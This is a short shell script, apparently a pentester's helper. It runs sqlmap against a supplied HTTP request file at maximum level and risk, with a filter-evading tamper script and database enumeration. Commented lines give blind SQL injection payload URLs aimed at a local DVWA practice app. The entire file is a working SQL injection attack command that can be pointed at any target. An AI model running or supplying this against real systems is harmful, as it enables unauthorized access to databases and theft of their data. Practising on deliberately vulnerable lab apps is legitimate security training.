##url="$1"
###sqlmap -u $url --batch
### ./sqlmap.py -u 'http://mywebsite.com/page.php?vulnparam=hello'
### http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1%27+AND+1=1+%23-BR&Submit=Submit#
### http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1%27+AND+1=0+%23-BR&Submit=Submit#

request="$1"

sqlmap -r $request --batch --delay=0.5 --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
